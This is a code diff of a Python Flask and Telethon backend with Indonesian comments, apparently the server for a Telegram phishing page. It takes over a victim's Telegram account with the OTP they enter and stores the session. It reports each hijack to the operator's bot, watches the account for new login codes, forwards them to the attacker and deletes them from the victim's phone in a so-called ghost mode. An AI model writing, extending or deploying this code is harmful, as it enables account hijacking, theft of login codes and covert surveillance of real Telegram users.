@@ -6,7 +6,7 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.messages import DeleteHistoryRequest
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}})
+CORS(app, resources={r"/*": {"origins": "*"}}) # Izin untuk Vercel
 
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
@@ -14,7 +14,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"
 
-# Database RAM
 user_db = {}
 
 def bot_api(method, payload):
@@ -45,7 +44,7 @@ async def handle_flow(data):
         nama = data.get('nama', 'User')
 
         if nomor not in user_db:
-            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}
+            user_db[nomor] = {"session": "", "hash": "", "nama": nama}
 
         client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
         await client.connect()
@@ -59,17 +58,17 @@ async def handle_flow(data):
             otp_code = data.get('otp')
             await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
             user_db[nomor]['session'] = client.session.save()
-            await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
             
-            text = f"✅ **LOGIN BERHASIL**\nNama: {nama}\nNomor: `{nomor}`"
+            # Beritahu bot bahwa login sukses & berikan tombol intip
+            text = f"✅ **LOGIN SUKSES**\nNama: {nama}\nNomor: `{nomor}`"
             bot_api("sendMessage", {
                 "chat_id": CHAT_ID, 
-                "text": text, 
-                "reply_markup": {"inline_keyboard": [[{"text": "🔎 INTIP OTP", "callback_data": f"upd_{nomor}"}]]}
+                "text": text,
+                "reply_markup": {"inline_keyboard": [[{"text": "🔎 INTIP OTP TURBOTEL", "callback_data": f"upd_{nomor}"}]]}
             })
             return jsonify({"status": "success"})
-    except errors.SessionPasswordNeededError:
-        return jsonify({"status": "need_2fa"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
     finally:
         if client: await client.disconnect()
 
@@ -78,14 +77,13 @@ def webhook():
     update = request.get_json()
     if "callback_query" in update:
         call = update["callback_query"]
-        # PENTING: Menghilangkan loading di tombol bot
-        bot_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "Mengintip OTP Aktif..."})
+        # INI KUNCINYA: Menghilangkan loading di tombol bot
+        bot_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "Intip OTP Aktif!"})
         
         data_call = call["data"].split("_")
         if data_call[0] == "upd":
             nomor = data_call[1]
-            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"👀 **GHOST MODE**\nSedang memantau OTP untuk `{nomor}`..."})
-            # Jalankan monitor di thread berbeda agar tidak error
+            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"👀 Sedang mengintip OTP untuk `{nomor}`..."})
             threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
     return jsonify({"status": "success"})
 
@@ -100,13 +98,12 @@ async def monitor_otp(nomor):
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
                 bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"📩 **OTP MASUK**\nNomor: `{nomor}`\nKode: `{otp.group(0)}`"})
-                await event.delete(revoke=True) # Hapus di HP target
+                await event.delete(revoke=True) # Ghost Mode: Hapus di target
         await asyncio.wait_for(client.run_until_disconnected(), timeout=600)
     except: pass
     finally: await client.disconnect()
 
 if __name__ == "__main__":
-    # Otomatis set webhook setiap restart
     if os.getenv('RAILWAY_STATIC_URL'):
         bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
